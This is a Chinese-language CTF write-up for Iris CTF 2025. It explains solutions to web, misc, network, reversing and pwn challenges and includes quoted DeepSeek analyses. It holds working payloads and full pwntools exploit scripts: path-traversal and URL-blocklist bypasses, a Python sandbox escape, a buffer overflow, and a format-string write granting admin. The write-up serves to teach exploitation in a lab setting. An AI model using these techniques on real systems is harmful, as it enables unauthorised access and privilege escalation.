---
title: Iris CTF 2025
authors: RibomBalt
tags:
    - CTF
---

2025开年第一赛。这个比赛我的评价是还不错，有新手向题目有高手向，总的来说代码阅读量偏大。network和radio单独从misc/forensics分出来倒是比较少见（可惜这些部分要学的话需要花不少时间，我就没有去弄了）。OSINT还是，呃呃，不会做，看着大家把这些都杀到50分我也是无话可说。

对了，这次比赛我也第一次尝试了deepseek v3的深度思考（作为o1的平替），发现帮我理清思路，提升注意力方面确实有一定优势，只是不能完全依赖。

<!-- truncate -->
## web - Password Manager ⭐

一个go语言写成的Web密码管理器。

通过阅读源码，可以知道密码保存在本地3306的mysql数据库中，应用启动时使用`./users.json`初始化主用户密码。已知密码管理器的运作原理就是，验证主密码之后，就可以获取其他的密码。

`pages`函数是一个自己实现的处理路由的模块。所有页面设计上在`./pages`目录下，并试图防止路径穿越：

```go
var PathReplacer = strings.NewReplacer(
        "../", "",
)

func pages(w http.ResponseWriter, r *http.Request) {
        // You. Shall. Not. Path traverse!
        path := PathReplacer.Replace(r.URL.Path)

        if path == "/" {
                homepage(w, r)
                return
        }

        if path == "/login" {
                login(w, r)
                return
        }

        if path == "/getpasswords" {
                getpasswords(w, r)
                return
        }

        fullPath := "./pages" + path

        if _, err := os.Stat(fullPath); os.IsNotExist(err) {
                notfound(w, r)
                return
        }

        http.ServeFile(w, r, fullPath)
}
```
然而go语言的`strings.NewReplacer`默认不是递归匹配，因此可以用双写法绕过：`/..././users.json` （注意如果用requests库需要禁用URL normalization）

获取主密码后，登录后访问主页即可看到三组密码，其中一个是flag。

`irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}`

## web - Political ⭐⭐
这个题主要考的的Chrome系浏览器的policy。

在Linux上，可以通过`/etc/opt/chrome/policies/managed`目录下的一个`json`文件为浏览器增加组策略，可以对浏览器访问进行黑名单/白名单控制。其中一个用法是禁用`view-source`域以阻止访问网页源码。不过似乎只在Linux下有用，Windows下必须要用组策略管理器控制。

说回题目。这个题模拟了一个兑换码场景。服务端有一个缓存数据库（全局变量字典）记录了哪些token可以兑换flag，而有admin cookie的bot可以访问`/giveflag?token=xxx`，给任意token加兑换权限。我们可以通过一个TCP连接让admin bot访问一个链接。（就是说，目标是CSRF）

这个题的附件给的黑名单是：

```json
{
        "URLBlocklist": ["*/giveflag", "*?token=*"]
}
```

然而这种过滤是非常弱的，比如`//giveflag`路径可以绕过第一个，而`?tok%65n=xxx`可以绕过第二个。不过`?a=1&token=xxx`无法绕过第二个，这个语法并非简单的正则匹配，而是先解析出各个字段后再进行后处理的。

## misc - O_WRONLY ⭐⭐

这个题给了一个有问题的驱动模块，我们要读取这个驱动保护下的`/dev/vda`文件，我首先把驱动源码丢给deepseek V3：

> ### 功能分析
> 
> 这段代码的功能是通过劫持系统调用 `do_sys_openat2`，来拦截对特定文件名（`TARGET_FILE_NAME`，即 "vda"）的打开操作。当检测到对这个文件的打开请求时，它会返回一个伪造的文件结构，使得对该文件的读操作返回 "Permission Denied\n"，而写操作不实际写入数据。
> 
> 具体步骤如下：
> 
> 1. **伪造文件操作函数**：定义了 `phony_read` 和 `phony_write` 函数，分别伪造读取和写入操作。
>    
> 2. **创建伪造文件结构**：在 `get_cursed` 函数中，打开 `/dev/null` 并将其文件操作指向伪造的操作函数。
> 
> 3. **挂钩系统调用**：通过 `kretprobe` 挂钩 `do_sys_openat2` 系统调用的返回过程，检查打开的文件名。
> 
> 4. **拦截并替换文件描述符**：在 `open_handler` 中，如果打开的是目标文件，就用伪造的文件结构替换实际的文件描述符。
> 
> ### 存在的问题
> 
> 1. **不安全的用户空间数据处理**：
>    - 在 `open_entry_handler` 中，`strncpy_from_user` 复制用户空间数据时，没有正确处理可能的溢出情况，且长度处理不严谨。
> 
> 2. **文件名解析错误**：
>    - 手动解析文件名中的路径分隔符的方式不准确，可能导致错误匹配文件名。
> 
> 3. **直接修改文件描述符表**：
>    - 在 `open_handler` 中，直接修改进程的文件描述符表，这种操作非常危险，可能导致文件描述符泄露或不一致。
> 
> 4. **引用计数管理不当**：
>    - 在 `get_cursed` 中，打开 `/dev/null` 并修改其文件操作，但没有正确管理文件指针的引用计数，可能引发内存泄漏或使用已释放的内存。
> 
> 5. **多线程环境下的竞态条件**：
>    - 修改文件描述符表时，未考虑多线程环境下的竞态条件，可能导致数据不一致。
> 
> 6. **错误处理不完善**：
>    - 在 `open_handler` 中，未充分处理系统调用失败的情况，可能造成文件描述符分配错误。
> 
> 7. **潜在的权限问题**：
>    - 劫持系统调用可能绕过权限检查，导致严重的安全漏洞。
> 
> ### 总结
> 
> 该代码通过劫持文件打开操作来伪造文件读写行为，但实现过程中存在多处安全漏洞和潜在的稳定性问题，可能导致系统崩溃或被攻击。

嗯，基本总结了我们着重看的区域。这个驱动模块主要对openat调用的返回做了一个hook，如果文件名满足特定条件，会不返回真实文件句柄，而是返回一个假的文件，读取假的文件只会读到`Permission Denied`字符串，写入文件则只有光标移动没有内容写入。

对文件名的判断是这个函数：

```c
static int open_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs) {
	struct file_input* input = (struct file_input*)ri->data;

	input->flags = ((struct open_how *)regs->dx)->flags;

	int len = strncpy_from_user(input->name, (char __user*)regs->si, 2000);
	if (unlikely(len <= 0)) {
		return 1;
	}

	int i;
	for (i = len; i > 0 && input->name[i] != '/'; i--);

	if (input->name[i] == '/')
		i++;

	if (i >= 2000)
		i = 0;

	if (strcmp(input->name + i, TARGET_FILE_NAME) == 0) {
		return 0;
	}

	return 1;
}
```

可以看出，它试图从最后一个字符开始，往前找到第一个`/`或者开头，然后排除掉`/`取后一部分，也就相当于是取了`basename`，如果它等于`vda`就返回假文件，这部分很严谨。但是，它还做了一个判断，就是假如停下来的位置`i>=2000`，也就是这个文件的目录长度大于2000，反而会让`i=0`，即放弃了之前匹配的basename反而去用整个路径了（非常迷惑的实现）

于是，我们可以让它`cat /dev/././././././././vda` (中间有1000个`./`)，就可以直接拿到flag了。qemu的sh里似乎不能打这么长的命令，所以需要写入文件。最好不要用`vi`，而是用`echo`重定向慢慢写。

## misc - Cobra's Den ⭐⭐⭐

Python沙箱逃逸：

```python
# flag stored at 'flag' in current dir

import builtins

all_builtins = dir(builtins)
filtered_builtins = {name: getattr(builtins, name) for name in all_builtins if len(name) <= 4}
filtered_builtins.update({'print': print})

whitelist = "<ph[(cobras.den)]+~"
security_check = lambda s: any(c not in whitelist for c in s) or len(s) > 1115 or s.count('.') > 1

print('Good luck!')
while True:
    cmd = input("Input: ")
    if security_check(cmd):
        print("No dice!")
    else:
        try:
            eval(f"print({cmd})", {"__builtins__": filtered_builtins})
        except SyntaxError as e:
            print(f"Syntax error: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")
```

- builtins函数做了限制，只有长度小于4个字节的加上print存在于环境中
- 字符有白名单，并且`.`限制最多一次。当然这个白名单非常松，小括号中括号都在。
  - 同时满足白名单和长度限制的builtins函数包括：`'abs', 'chr', 'hash', 'open', 'ord', 'repr'`

因此目标就是`open("flag").read()`。这个题只有`flag`这个字符串是需要我们自己凑出来的

- `[]<[] == False`, `[]<[[]] == True`
- `False + False == 0`, `False + True == 1`, `True << (True + True + True) == 8`
- 可以用`chr(ord(s) + True + True)`这种表达。

所以可以非常容易得到一个解：

```py
whitelist = "<ph[(cobras.den)]+~"
FALSE='[]<[]'
TRUE='[]<[[]]'
ZERO='([]<[])+([]<[])'
ONE='([]<[[]])+([]<[])'
# chr

allowed_builtins = ['None', 'True', 'abs', 'all', 'any', 'bin', 'bool', 'chr', 'dict', 'dir', 'eval', 'exec', 'exit', 'hash', 'help', 'hex', 'id', 'int', 'iter', 'len', 'list', 'map', 'max', 'min', 'next', 'oct', 'open', 'ord', 'pow', 'quit', 'repr', 'set', 'str', 'sum', 'type', 'vars', 'zip', 'print']

# ['abs', 'chr', 'hash', 'open', 'ord', 'repr']
allowed_builtins_whitelist = [s for s in allowed_builtins if all(c in whitelist for c in s)]

# open("flag").read() ?

F = f"repr(open)[(({TRUE})<<(({TRUE})+({TRUE})+({TRUE})))+({TRUE})+({TRUE})]"
L = f"repr(open)[(({TRUE})<<(({TRUE})+({TRUE})))]"
A = f"repr(abs)[(({TRUE})<<(({TRUE})+({TRUE})+({TRUE})+({TRUE})))+({TRUE})+({TRUE})+({TRUE})]"
G = f"chr(ord({F})+({TRUE}))"
target = f"open({F}+{L}+{A}+{G}).read()"
print(target, len(target))
assert all(s in whitelist for s in target)
```

## Network - No Shark ⭐

> 这个比赛把网络底层相关单独做了一个分类，后面还有几个需要手动模拟发网络包的题

这个题给了一个网络包的原始数据。

给大家看看deepseek的功力deepseek V3：

> 这是一段hex格式报文，请分析这是什么格式

> 根据提供的十六进制数据，这些报文是网络数据包，具体格式如下：
> 
> 1. **以太网帧 (Ethernet Frame)**：
>    - 目标MAC地址：`000000000000`（广播或本地循环）
>    - 源MAC地址：`000000000000`（同上）
>    - 以太网类型：`0800`（表示IP协议）
> 
> 2. **IP数据包 (IPv4 Packet)**：
>    - 版本：`4`（IPv4）
>    - 首部长度：`5`（20字节）
>    - 总长度：`003c`（60字节）
>    - 标识号：`7d15`
>    - 标志和分片偏移：`4000`（不分片，TTL为64）
>    - 协议：`06`（TCP协议）
>    - 源IP地址：`7f000001`（127.0.0.1）
>    - 目标IP地址：`7f000001`（127.0.0.1）
> 
> 3. **TCP段 (TCP Segment)**：
>    - 源端口：`815e`（33102）
>    - 目标端口：`1a6f`（7279）
>    - 序列号：`049536f5`
>    - 确认号：`00000000`
>    - 数据偏移：`a0`（20字节）
>    - TCP标志：`02`（PSH, ACK）
>    - 窗口大小：`ffd7`（65431）
>    - TCP校验和：`fe30`
>    - 紧急指针：`0000`
>    - 选项和数据：后续字节
> 
> 4. **数据部分**：
>    - 包含可能的应用层数据或payload，具体内容取决于上层协议。
> 
> **总结**：
> 
> 这些数据包是通过IPv4和TCP协议在本地回环地址（127.0.0.1）上传输的网络数据包。它们可能来自本地应用程序之间的通信，例如HTTP、FTP或其他自定义协议的数据传输。
> 
> **进一步分析建议**：
> 
> - 使用网络协议分析工具如Wireshark来解码和分析这些数据包，可以更清晰地看到各层协议的详细信息。
> - 如果需要了解具体的应用层数据，可能需要知道上层协议的格式和编码方式。

> 请进一步猜测TCP报文的格式

> 根据对提供的十六进制数据的分析，可以得出以下结论：
> 
> 1. **以太网帧 (Ethernet Frame)**：
>    - 目标MAC地址：`000000000000`（广播或本地循环）
>    - 源MAC地址：`000000000000`（同上）
>    - 以太网类型：`0800`（表示IP协议）
> 
> 2. **IP数据包 (IPv4 Packet)**：
>    - 版本：`4`（IPv4）
>    - 首部长度：`5`（20字节）
>    - 总长度：`003c`（60字节）
>    - 标识号：`7d15`
>    - 标志和分片偏移：`4000`（不分片，TTL为64）
>    - 协议：`06`（TCP协议）
>    - 源IP地址：`7f000001`（127.0.0.1）
>    - 目标IP地址：`7f000001`（127.0.0.1）
> 
> 3. **TCP段 (TCP Segment)**：
>    - 源端口：`815e`（33102）
>    - 目标端口：`1a6f`（7279）
>    - 序列号：`049536f5`
>    - 确认号：`00000000`
>    - 数据偏移：`a0`（40字节，表示头部长度）
>    - TCP标志：`02`（PSH, ACK）
>    - 窗口大小：`ffd7`（65431）
>    - TCP校验和：`fe30`
>    - 紧急指针：`0000`
>    - 选项字段：包含可能的MSS、窗口缩放、时间戳等选项
> 
> 4. **数据部分**：
>    - 数据开始于TCP头部之后，内容包含JPEG图像数据的标志，如`ffd8`（JPEG开始）、`ffe0`（APP0标记）、`4a464946`（"JFIF"），表明这是JPEG图像数据。
> 
> **总结**：
> 
> 这段数据是一个通过TCP协议在本地回环地址（127.0.0.1）上传输的网络数据包，包含标准的TCP头部和一些选项，数据部分是一个JPEG图像的数据。可能是在本地应用程序之间传输JPEG图像，例如通过HTTP协议传输图片资源。

不仅把包格式分析出来，还把载荷格式给猜出来了，很猛。总之确实是一个JPEG图片（不过应用层协议我确实没猜出来）。

## rev - Now this will run on my 486? ⭐⭐

给了一个x64 Linux程序让我们逆向。这个是经典的flag checker逆向题。特点：

- 包含了一个`sigaction`，似乎处理了某种信号。
- 包含了`sigaction`中包含大量`mprotect`调用，推测是self-modified code。

于是放进gdb里，在等待输入的时候，`gdb -p`连接调试器，找到有效载荷处，发现这边几乎都是手写的shellcode，每两条指令之间几乎都有大量的`nop`分隔。而前方不远处有一个`0x17`的`bad instruction`，想必再往前走就`SIGILL`了。

所以很容易明白那个`sigaction`就是用来处理`SIGILL`的，触发这个信号的时候就用这个函数把即将执行的代码改一遍。

因此，为了获取真实代码：

- `handle SIGILL noprint` (阻止调试器对这个信号的拦截)
- 在离开SMC段的地方下断
- 断点后，用`dump binary memory <st_addr> <ed_addr>`把SMC段导出，用ghidra反编译

之后会发现这个方法只会把这次已经执行到的分支处理好，而不会处理没有执行到的位置。恰好这个题又是多个（9个）if条件并列，第一个分支先判断输入所有字节的和，然后每四个字节为单位判断。虽然这么做比较累，但我还是针对每个分支都构造了一个输入让它进入下个分支，之后在反编译中就能获取到进入再下一个分支的条件了。


## pwn - sqlate ⭐
给源码的pwn，这个题是一个基于sqlite的数据管理系统。只有一个用户，但是用户权限有细粒度的控制，增删改查包括查看flag的权限都是用某个权限字段不同的位实现的。

顺便看看deepseek帮我集中注意力：

> ## 缓冲区漏洞分析
> 
> 经过对代码的详细审查，发现存在多个潜在的缓冲区漏洞。缓冲区漏洞通常是由于不正确地处理内存缓冲区导致的，可能导致程序崩溃、数据损坏或被攻击者利用执行恶意代码。
> 
> ### 潜在的缓冲区溢出漏洞
> 
> 1. **`read_to_buffer`函数**
> 
>    ```c
>    void read_to_buffer(const char* description) {
>        printf("Enter %s: ", description);
>        fgets(line_buffer, 256, stdin);
>    }
>    ```
> 
>    - `line_buffer`大小为512字节，但`fgets`只读取256字节（包括换行符和空字符）。
>    - 这里不会溢出，但需要注意`fgets`保留换行符，可能导致后续处理问题。
> 
> 2. **`action_login`函数中的密码复制**
> 
>    ```c
>    strcpy(admin_password, pass);
>    ```
> 
>    - `admin_password`大小为512字节，`pass`是Base64编码后的字符串，需确保其长度不超过511字节（留一个字节给空字符）。
>    - Base64编码会增加数据长度，原始数据长度为100字节时，编码后长度约为134字节，不会溢出。
> 
> 3. **`action_login`函数中的密码比较**
> 
>    ```c
>    for (unsigned long i = 0; i < length && i < 512; i++) {
>        if (line_buffer[i] != admin_password[i]) {
>            printf("Wrong password!\n");
>            return;
>        }
>    }
>    ```
> 
>    - 比较时未考虑`line_buffer`中可能包含的换行符，可能导致密码验证逻辑错误。
>    - 建议去除`line_buffer`中的换行符后再进行比较。
> 
> 4. **`action_create`、`action_update`、`action_info`等函数中的`strcpy`使用**
> 
>    - 多个地方使用`strcpy`复制字符串到固定大小的数组（如`paste.title`、`paste.language`、`paste.content`），但没有检查源字符串的长度。
>    - 如果数据库中存储的数据超过255字节，`strcpy`会导致缓冲区溢出。
> 
> 5. **`action_info`函数中的数据复制**
> 
>    ```c
>    strcpy(paste.title, title);
>    strcpy(paste.language, language);
>    strcpy(paste.content, content);
>    ```
> 
>    - `title`、`language`、`content`来自数据库查询，可能超过255字节，导致`paste`结构体的缓冲区溢出。
> 
> 6. **`action_list`函数中的数据复制**
> 
>    ```c
>    strcpy(paste.title, title);
>    strcpy(paste.language, language);
>    strcpy(paste.content, content);
>    ```
> 
>    - 同上，没有检查数据库字段长度，可能引发缓冲区溢出。
> 
> ### 其他安全问题
> 
> 1. **硬编码调试信息**
> 
>    ```c
>    if (DEBUG) {
>        printf("Generated random admin password: %s\n", admin_password);
>    }
>    ```
> 
>    - 如果`DEBUG`开启，会泄露随机生成的管理员密码，需确保在生产环境中关闭调试信息。
> 
> 2. **`action_sys`函数的命令注入风险**
> 
>    ```c
>    void action_sys() {
>        system("/usr/bin/cat flag");
>    }
>    ```
> 
>    - 虽然当前调用的命令是固定的，但如果未来修改为包含用户输入，可能会导致命令注入漏洞。
> 
> ### 缓冲区漏洞修复建议
> 
> 1. **在复制字符串时进行长度检查**
> 
>    - 使用`strncpy`代替`strcpy`，并确保目标缓冲区有足够的空间。
>    - 示例：
> 
>      ```c
>      strncpy(paste.title, title, sizeof(paste.title) - 1);
>      paste.title[sizeof(paste.title) - 1] = '\0';
>      ```
> 
> 2. **处理`fgets`读取的换行符**
> 
>    - 在使用`fgets`读取输入后，检查并去除换行符。
>    - 示例：
> 
>      ```c
>      line_buffer[strcspn(line_buffer, "\n")] = '\0';
>      ```
> 
> 3. **确保Base64编码后的字符串长度在范围内**
> 
>    - 在`init_admin`函数中，生成随机密码并进行Base64编码时，检查编码后的字符串长度是否超过`admin_password`的大小。
> 
> 4. **修复`action_login`中的密码比较逻辑**
> 
>    - 去除`line_buffer`中的换行符后再进行密码比较，避免因换行符导致的验证错误。
> 
> 5. **限制数据库字段的长度**
> 
>    - 在创建数据库表时，为`title`、`language`、`content`字段设置最大长度，确保不会存储过长的数据。
>    - 示例：
> 
>      ```sql
>      CREATE TABLE IF NOT EXISTS entries(
>          user INT,
>          title TEXT CHECK(length(title) <= 255),
>          language TEXT CHECK(length(language) <= 255),
>          content BLOB CHECK(length(content) <= 255)
>      )
>      ```
> 
> ### 总结
> 
> 该程序存在多个潜在的缓冲区溢出漏洞，主要集中在字符串复制和输入处理部分。通过添加长度检查、使用安全的字符串函数、处理换行符以及限制数据库字段长度，可以有效防止缓冲区溢出攻击。建议进行全面的代码审查，并采用静态代码分析工具来检测其他潜在的安全漏洞。

漏洞在于`action_update`函数中，`content`为`hex`的分支有数组越界，可以溢出到bss段临近的`current_user`中，而`current_user`中控制各种权限的字段刚好可以被覆盖到。

```py
from pwn import context, gdb, remote, process, p64, p32, sys, pidof
from sys import argv

context.log_level = "debug"
context.arch = "amd64"

conn = remote("sqlate.chal.irisc.tf", 10000) if "r" in argv else process("sqlate/vuln")
if "r" not in argv:
    context.terminal = ["tmux", "new-window"]
    gdb.attach(
        pidof(conn)[0],
        f"""
b *$rebase(0xaf4e)
""",
    )

# create
conn.sendlineafter(b">", b'1')
conn.sendlineafter(b":", b'asd')
conn.sendlineafter(b":", b'zxc')
conn.sendlineafter(b":", b'qwe')

# update
conn.sendlineafter(b">", b'2')
conn.sendlineafter(b">", b'2')
conn.sendlineafter(b">", b'2')
conn.sendlineafter(b":", b'\xee'*191)
conn.sendlineafter(b":", b'asd')

# info
conn.sendlineafter(b">", b'3')
conn.sendlineafter(b":", b'asd')

# flag

conn.sendlineafter(b">", b'7')

conn.interactive()
# irisctf{classic_buffer_issues}
```

## pwn - MyFiles ⭐⭐
是一个zip文件管理系统。可以有最多16个用户，每个用户可以报关至多0x100个最大可以0x200字节的单文件zip文件。

权限控制分为这么几个级别：

- 什么都没有，可以列出所有用户，列出所有文件（但是文件内容只能拿到名称，hash和大小）
- 有邀请码，可以创建新的用户，指定用户名密码。
- 有用户名密码，可以viewFile查看文件具体内容，viewFile函数内有格式化字符串漏洞。
- 用户管理员位不为0，可以看flag

程序初始化时，建立了一个用户，其中保存的是邀请码，所以第一步是尝试用上传文件的方法得到这个邀请码。

接下来说说上传文件。我们上传的是Zip文件，确切地说是前半部分。上传时只验证`magic`和`uncompressed flag`，第一个文件对应的文件名长度和文件内容长度。这个部分有相当多的大小校验，但是两个长度字段都可以是负数，这就导致可以构造一些有趣的东西：比如如果文件名长度为负，那么后面计算hash时就会从更低的地址开始，相当于可以进行向低地址读。

通过搜索hash的magic number可以看出是FNV-1a算法，没有好的可利用手段。程序中也限制了文件大小不得小于10，所以不能用暴力搜索方法逆向hash。然而，初始化过程中有一个内存清零的过程，所以目标包含邀请码的zip文件后面有非常长的部分已知是NULL，所以只需要一个一个字节往前错就可以知道前面任意长的字节（实际操作下来因为有其他各种大小check一次最多泄漏前面0x40字节，但是可以反复多次进行，泄漏出任意长的内容）

拿到邀请码后，就可以创建用户利用格式化字符串了。刚好因为`viewFile`函数前面要验证用户名密码，而用户名密码地址都是bss段，所以也就绕过了PIE，可以直接往管理员权限位写入内容了。

```py
from pwn import *
from tqdm import tqdm
from sys import argv

context.log_level = 'debug'
context.arch = 'amd64'

conn = remote('myfiles.chal.irisc.tf', 10001) if 'r' in argv else process(['myfiles/chal'])
if 'r' not in argv:
    context.terminal = ['tmux', 'new-window']
    gdb.attach(pidof(conn)[0], \
f'''
b *$rebase(0x23b7)
''')

# FNV-1a hash
def calc_hash(param_1: bytes, param_2: int) -> int:
    local_10 = 0xcbf29ce484222325  # Initial hash value
    for local_14 in range(param_2):
        local_10 = ((local_10 ^ param_1[local_14]) * 0x100000001b3) % (2**64)
    return local_10

# # fake zip (can be negative size??)
# # when fname size is negative, 
# plain_fname = b'a' * 0x20
# plain_content = b''
# fake_zip = bytearray(0x1e + len(plain_fname) + len(plain_content))
# fake_zip[:4] = b'PK\x03\x04'
# # fake_zip[0x12:0x16] = p32(len(plain_content))
# # fake_zip[0x1a:0x1e] = p32(len(plain_fname))

# # sz_content
# fake_zip[0x12:0x16] = p32(10)
# # sz_fname
# fake_zip[0x1a:0x1e] = p32(0xffffffff)
# fake_zip[0x1e:] = plain_fname + plain_content

# # print(fake_zip)
# if len(fake_zip) > 511:
#     print(f"zip size exceed 512: {len(fake_zip)}")
#     # conn.close()
#     # exit(-1)
#     fake_zip = fake_zip[:511]

def fake_zip_any(sz_content, sz_fname, content):
    """
    """
    fake_zip = bytearray(0x1e)
    fake_zip[:4] = b'PK\x03\x04'
    fake_zip[0x12:0x16] = p32(sz_content)
    fake_zip[0x1a:0x1e] = p32(sz_fname)
    

    return bytes(fake_zip) + content


def fake_zip_by_offset(offset: int, fid: int):
    """
    """
    fake_zip = bytearray(0x1e + 0x60)
    fake_zip[:4] = b'PK\x03\x04'

    # sz_content
    fake_zip[0x12:0x16] = p32(10)
    # sz_fname
    fake_zip[0x1a:0x1e] = p32(2**32 - offset - 0x204 * (fid - 1))
    # fake_zip[0x1e:0x1e + 8] = 

    return fake_zip



def leak_invitecode(start_offset = 0x170, known_content = p8(0) * 0xa):
    for fid in tqdm(range(1, 0x40)):
        offset = start_offset + fid - 1
        fake_zip = fake_zip_by_offset(offset, fid)
        # upload myfile
        conn.sendlineafter(b">", b"4")
        conn.sendlineafter(b"?", b"15")
        conn.sendlineafter(b"one uncompressed file", fake_zip.hex().encode())

    # list files
    conn.sendlineafter(b">", b"2")
    conn.sendlineafter(b"?", b"15")

    conn.recvline_contains(b"invitecode.txt", keepends=False)

    while fid_line := conn.recvline(keepends=False).decode():
        fid_hash: int = int(fid_line.split()[-1], 16)

        # print(f"{fid_hash = :x}")
        for guess in range(0x100):
            guess_line = p8(guess) + known_content[:0xa - 1]
            if fid_hash == calc_hash(guess_line, 0xa):
                known_content = p8(guess) + known_content
                # print('\r', known_content, end='')
                break
        else:
            print(f'warning: not guessed: {fid_line}')

    return known_content

# every time start offset + 0x3f

# print(leak_invitecode(start_offset=0x170 + 0x3f * 3, known_content=b'\x00\x00@\x00\x00\x00\xb6\x00\x00\x00PK\x03\x04\n\x00\x00\x00\x00\x00T`\x97YL\xf1\xa5\xee\x14\x00\x00\x00\x14\x00\x00\x00\x0e\x00\x00\x00invitecode.txtyelling-pixel-coralsPK\x01\x02?\x00\n\x00\x00\x00\x00\x00T`\x97YL\xf1\xa5\xee\x14\x00\x00\x00\x14\x00\x00\x00\x0e\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00invitecode.txt\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00u\x97\x18\xdbdU\xdb\x01+\xdc\xa4\xdbdU\xdb\x01`\xcaX,dU\xdb\x01PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00`\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))


INVITE_CODE = 'yelling-pixel-corals' if 'r' in argv else 'terrible-red-busses'

# create user
conn.sendlineafter(b">", b"3")
conn.sendlineafter(b"?", INVITE_CODE.encode())
conn.sendlineafter(b"?", b"me")
conn.sendlineafter(b"?", b"me")

# upload a file
# 14 is format string input
# 10 is Zipinfo, what returned
# 8 is &fileUsers
format_str = b'%8$p              '
conn.sendlineafter(b">", b"4")
conn.sendlineafter(b"?", b"0")
conn.sendlineafter(b"one uncompressed file", fake_zip_any(len(format_str), 0, format_str).hex().encode())

# view file
conn.sendlineafter(b">", b"5")
conn.sendlineafter(b"?", b"0")
conn.sendlineafter(b"?", b"me")
conn.sendlineafter(b"?", b"0")

while not (fileuser_addr := conn.recvline(keepends=False)):
    pass
fileuser_addr = int(fileuser_addr.decode(), 16)

print(f"{fileuser_addr = :x}")

# upload file to change admin
format_str = b'%12c%16$hhn'.ljust(0x10, b'A') + p64(fileuser_addr + 0x10)
conn.sendlineafter(b">", b"4")
conn.sendlineafter(b"?", b"0")
conn.sendlineafter(b"one uncompressed file", fake_zip_any(len(format_str), 0, format_str).hex().encode())

# view again
conn.sendlineafter(b">", b"5")
conn.sendlineafter(b"?", b"0")
conn.sendlineafter(b"?", b"me")
conn.sendlineafter(b"?", b"1")

# read flag
conn.sendlineafter(b">", b"6")
conn.sendlineafter(b"?", b"0")
conn.sendlineafter(b"?", b"me")


conn.interactive()
# irisctf{tom_needs_to_rethink_his_security}
```